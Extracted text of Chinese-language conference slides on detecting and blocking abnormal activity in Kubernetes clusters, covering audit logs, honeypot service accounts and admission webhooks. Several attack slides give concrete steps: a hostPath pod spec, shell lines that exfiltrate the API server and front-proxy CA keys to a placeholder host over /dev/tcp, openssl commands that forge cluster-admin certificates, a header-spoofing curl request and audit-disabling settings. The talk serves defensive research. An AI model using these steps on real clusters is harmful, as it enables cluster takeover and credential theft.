KUBERNETES中的异常活动检测
About me
0 1
@9ian1i
朱思宇
blue teamer，⼊侵对抗，业余安全开发，阿⾥云融媒体安全。
DEFCON Blue Team Village，Black Hat Arsenal 演讲者。
WatchAD – AD Security Intrusion Detection System
crawlergo – A powerful browser crawler for web vulnerability scanners
??? - kubernetes abnormal activity detection and blocking system
开源安全项⽬：
安全⻛险
安全防护
K8S安全⻛险与防护现状
0 2
Threat matrix for Kubernetes
0 3
K8S安全防护现状
*检测能⼒数据来⾃各家官⽅⽹站⽂档
https://docs.microsoft.com/en-us/azure/security-center/alerts-reference#alerts-k8scluster
https://help.aliyun.com/document_detail/191144.html#title-seo-no0-8zv
Alibaba Cloud
Google Cloud
Azure Cloud
0
AWS Cloud
0
7
云⼚商
15
K8S集群异常活动检测项数量
具备相关能⼒的国外安全⼚商
除了云⼚商，国内普遍对K8S安全防护关注不够，还停留在基线加固阶段
04
检测与对抗
05
Architecture based of audit logs detection
0 6
UI
User
Interface
CLI
Command
Line
interface
API
Server
Master
Audit Log
Logtail Agent
MQ
Threat Analytics
Alerts for
suspicious activities
Node 1
Node 2
Node n
0 7
About k8s auditing
*审计策略格式样例
         k8s审计事件⽇志可记录访问API Server的所有请求，配合
审计策略设置，能记录请求与响应的详细数据。
         每个Master节点上的审计⽇志并不会相互同步，需要收集
所有Master节点。
它能记录下⾯三个关键问题：
•
⽤户身份与授权信息
•
请求的操作与资源详情
•
请求的结果与响应
0 8
User
Interface
Master
etcd
API
Server
Control-
manager
scheduler
ns
default-token-xxxxx
sa-token-xxxxx
other-token-xxxxx
Host
Secrets
Node
Pod
Pod
Compromised
container
Web App
Access API Server
Master A
Master B
Master N
API Server
API Server
API Server
负载
均衡
6443
8080
容器集群渗透⼯具       匿名登录尝试       集群信息探
测
0 9
SA Suspicious Activity
通过对SA进⾏⾏为学习记录，建⽴操作基线，超出则告警。
 1 0
Honeypot Account
ns
Node
Secrets
default-token-xxxxx
normal-sa-token-xxxxx
fake-admin-token-xxxxx
... 
Pod A
Pod B
Host OS
file: ~/.kube/kubeconfig
投放
蜜饵账户
... 
1 1
About k8s RBAC
1 2
Privilege Escalation – RBAC rolebinding/bind
hacker
API
Server
Create 
rolebinding
auditing
normal account
cluster-admin 
role
admin privileges
 account
1 3
Privilege Escalation – RBAC createpod and SA bind
hacker
createpod privilege
create pod req
API
Server
pod
send token
Get admin JWT token
1 4
Certificate Authentication = Golden Ticket ?
UI
User
Interface
K8S的重要认证⼏乎都依赖客户端证书机制，三套CA证书与私钥是认证体系的安全核⼼
1 5
Golden Ticket – Client Certificate
apiVersion: v1
kind: Pod
metadata:
  name: get-crt-key
  namespace: kube-system
spec:
  hostIPC: true
  nodeName: master
  volumes:
  - name: k8s 
    hostPath:
      path: /etc/kubernetes/
  containers:
  - image: centos:7
    name: centos
    command: ["/bin/bash"]
    args: ["-c", "command"]
    volumeMounts:
    - mountPath: "/etc/kubernetes"
      name: k8s
如何⽣成⼀张超级管理员⾦票？
第⼀步：窃取API Server的CA证书和私钥，并发送到远程服务器
hacker
create pod req
读取并发送CA证书
ps -aux | grep kube-apiserver | awk 'BEGIN{i=1}{gsub(/\s/,"\n");i++;print}' | 
grep '\-\-client-ca-file' | awk -F= '{print $2}'| xargs cat > /dev/tcp/your_ip/port
读取并发送CA私钥
ps -aux | grep kube-controller-manager | awk 
'BEGIN{i=1}{gsub(/\s/,"\n");i++;print}' | grep '\-\-cluster-signing-key-file' | 
awk -F= '{print $2}'| xargs cat > /dev/tcp/your_ip/port
1 6
第⼆步：使⽤CA私钥与证书，本地签发cluster-admin证书
Golden Ticket – Client Certificate
cluster-admin
⽣成个⼈私钥
openssl genrsa -out admin.key 2048
⽣成cluster-admin⽤户，masters组的证书请求
openssl req -new -key admin.key -out admin.csr -subj "/CN=cluster-admin/O=system:masters"
⽤上述⽣成的证书请求，签发⾦票证书，有效期10年
openssl x509 -req -in admin.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out admin.crt -days 3650
1 7
Golden Ticket – User Forgery
如何⽣成⼀张任意⽤户（即使不存在）的⾦票？
第⼀步：窃取requestheader的CA证书和私钥，查询                                                              , 并发送到远程服务器。
—requestheader-allowed-names
hacker
create pod req
apiVersion: v1
kind: Pod
metadata:
  name: get-crt-key
  namespace: kube-system
spec:
  hostIPC: true
  nodeName: master
  volumes:
  - name: k8s 
    hostPath:
      path: /etc/kubernetes/
  containers:
  - image: centos:7
    name: centos
    command: ["/bin/bash"]
    args: ["-c", "command"]
    volumeMounts:
    - mountPath: "/etc/kubernetes"
      name: k8s
读取并发送CA证书
ps -aux | grep kube-apiserver | awk 
'BEGIN{i=1}{gsub(/\s/,"\n");i++;print}' | grep '\-\-requestheader-
client-ca-file' | awk -F= '{print $2}'| xargs cat > 
/dev/tcp/your_ip/port
读取并发送CA私钥
cat /etc/kubernetes/pki/front-proxy-ca.key > 
/dev/tcp/your_ip/port
读取并发送 requestheader-allowed-names
ps -aux | grep kube-apiserver | awk 
'BEGIN{i=1}{gsub(/\s/,"\n");i++;print}' | grep '\-\-requestheader-
allowed-names' | awk -F= '{print $2}'> /dev/tcp/your_ip/port
CA私钥
CA证书
requestheader-allowed-names
front-proxy-client
1 8
hacker
Golden Ticket – User Forgery
第⼆步：使⽤requestheader的CA私钥与证书，本地签发指定⽤户证书
⽣成个⼈私钥
openssl genrsa -out user.key 2048
⽣成 CN=front-proxy-client 证书请求
openssl req -new -key user.key -out user.csr -subj "/CN=front-proxy-client"
⽤上述⽣成的证书请求，签发证书，有效时间10年
openssl x509 -req -in user.csr -CA front-proxy-ca.crt -CAkey front-proxy-ca.key -CAcreateserial -out user.crt -days 3650
第三步：使⽤该证书发起请求，伪造任意⽤户
curl -ki --cacert front-proxy-ca.crt --key siyu.key --cert siyu.crt 
http://39.107.182.57:6443/api/v1/secrets -H 'X-Remote-Group: 
system:masters' -H 'X-Remote-User: hacker'
1 9
Defense Evasion
remove audit log settings
set --allow-privileged=true
set --insecure-port=9443
set --secure-port=9444
set --anonymous-auth=true
set --authorization-mode=AlwaysAllow
dump
create
update
kube-apiserver-
xxx.yaml
Shadow API Server
2 0
怎么优化？
已知问题：
•
存在攻击⼿法可绕过K8S审计事件⽇志。
•
当前架构只能事后审计检测，⽆法实时阻断。
•
对于⾮云环境，⼤规模⽇志实时消费对于基础设施有⼀定要求。
除了审计事件⽇志，我们还能从什么地⽅进⾏检测？
2 1
Validating admission webhook
2 2
Architecture
UI
User
Interface
CLI
Command
Line
interface
API
Server
Master
Alerts for
suspicious activities
Node 1
Node 2
Node n
Mutating
Webhooks
Validating
Webhooks
etcd
Threat Analytics
Threat Analytics
By audit log
Dynamic Admission 
Control
2 3
Dynamic Admission Control
{
  "apiVersion": "admission.k8s.io/v1beta1",
  "kind": "AdmissionReview",
  "request": {
    "uid": "705ab4f5-6393-11e8-b7cc-42010a800002",
    "kind": {
      "group": "autoscaling",
      "version": "v1",
      "kind": "Scale"
    },
    "resource": {
      "group": "apps",
      "version": "v1",
      "resource": "deployments"
    },
    "subResource": "scale",
    "requestKind": {
      "group": "autoscaling",
      "version": "v1",
      "kind": "Scale"
    },
    "requestResource": {
      "group": "apps",
      "version": "v1",
      "resource": "deployments”
... ...
API
Server
// 遍历启动参数 查找⻛险项
for _, container := range pod.Spec.Containers {
   for _, cmd := range container.Command {
      if util.SliceFindStr(riskCmd, cmd) {
         // 发现⻛险启动命令
         vulCmdList = append(vulCmdList, cmd)
      }
   }
   // 查找是否开启了审计⽇志，未找到则告警
   for _, prefix := range auditSettingPrefix {
      if !util.SlicePrefixFind(container.Command, prefix) {
         missingAuditSettings = 
append(missingAuditSettings, prefix)
      }
   }
}
AdmissionReview Request
All Requests
Operations that 
need to be 
persisted to etcd
2 4
No coding , More Cloud Native
Gatekeeper
https://github.com/open-policy-agent/gatekeeper
https://github.com/open-policy-agent/opa
OPA
kube-mgmt
apiVersion: 
constraints.gatekeeper.sh/v
1beta1
kind: K8sRequiredLabels
metadata:
  name: ns-must-have-gk
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Namespace"]
  parameters:
    labels: ["gatekeeper"]
CLI
Command
Line
interface
API
Server
Validating Webhooks
etcd
2 5
End
K8S中⼼化管理带来的便捷，就会带来对应的安全⻛险，同时放⼤安全影响。
传统基于主机的防御架构和思路，在云原⽣环境上会明显⽔⼟不服。
•
传统环境注重横向移动，更多的在应⽤层寻找突破⼝。
•
云原⽣安全中，作为关键基础设施的K8S集群最为重要，攻击会更多的围绕拿下集群管理权限，
          从⽽接管整个集群，控制所有机器。
@9ian1i
@Qianlitp
PI:EMAIL
阿⾥云融媒体安全持续招聘⼊侵对抗、⻛控、应⽤安全、安全研发。
2 6
M        A        N        O        E        U        V        R        E
感谢观看！
KCon 汇聚⿊客的智慧